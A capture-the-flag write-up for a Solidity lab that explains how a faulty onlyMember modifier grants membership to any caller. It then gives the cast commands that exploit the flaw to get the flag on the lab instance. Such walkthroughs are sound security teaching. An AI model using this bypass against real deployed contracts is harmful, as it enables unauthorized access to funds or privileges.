To solve the Lab, we need to make `Setup:;playerSolved()` returns true, here is the code

```solidity
    function solvedByPlayer() public {
    playerSolved = bar.beerGlass(msg.sender) >= 1 ? true : false;
}

function isSolved() public view returns(bool){
    return playerSolved;
}
```

We first need to call the `solvedByPLayer()` function, because that function will update the state of `playerSolved()` bool, after that we can just simply press `Flag` button on the instance. Let's first look for a function that will modify `beerGlass` 

```solidity
function register() public payable isHuman{
    // You can register here, but still need the Onwer to add you in.
    require(msg.value >= 1e18, "Need 1 ether deposit.");
    balance[msg.sender] += msg.value;
}

function addMember(address _addMember) public isHuman onlyOwner(_addMember){
    require(balance[_addMember] > 0, "You need to deposit some money to become a member.");
    barMember[_addMember] = true;
}

function getDrink() public isHuman onlyMember{
    require(balance[msg.sender] > 0, "You need to deposit some money.");
    require(barMember[msg.sender] == true);
    beerGlass[msg.sender]++;
}
```

We have some options there, `register()`, `addMember()` and `getDrink()`, based on what we need we have to call the `getDrink()` but there is a modifier called `onlyMember` and `isHuman` plus we need our balance to be greater than zero. From the function alone, what we can tell is to become a member the `owner` must add the member manually by calling the `addMember()`, we can still call `register()` with the value 1 ether. Let's look the rest of the code now

```solidity
modifier isHuman(){
    require(msg.sender == tx.origin, "Only Human Allowed in this Bar!");
    _;
}

modifier onlyOwner(address _addMember) {
    require(owner == msg.sender, "Only Owner can add Member!");
    _;
}

modifier onlyMember() {
    barMember[msg.sender] = true;
    _;
}

receive() external payable{
    balance[msg.sender] += msg.value;
}
```

There are 3 modifiers that exist in the contract, the `isHuman()` modifier ensure that the `msg.sender` is same as `tx.origin`, meaning only EOA can interact with the contract. The `onlyOwner()` has 1 parameter which is `_addMember`. Now `onlyMember()` modifier, it is quite different than another modifier, instead of ensuring a condition, it actually set a condition, especially `msg.sender`, it sets the `barMember[msg.sender]` to become true, this is clearly a flaw by the developer.

Earlier we know that the `getDrink()` function use this modifier, this means what lefts now are giving ourselves some balance either by calling the `register()` function or directly send the contract some balance because it has `receive() external payable` defined there and directly add the amount to our balance. Okay then, the solve should be

```bash
// get the bar contract address
cast call -r $RPC_URL $SETUP_ADDR "bar()"

// send some money to the contract
cast send -r $RPC_URL --private-key $PK $BAR_ADDR --value 1ether

// get ourselves some drink
cast send -r $RPC_URL --private-key $PK $BAR_ADDR "getDrink()"

// call setup.sol::solvedByPlayer()
cast send -r $RPC_URL --private-key $PK $SETUP_ADDR "solvedByPlayer()"
```

After that we just need to click Flag, and we should've solved the lab.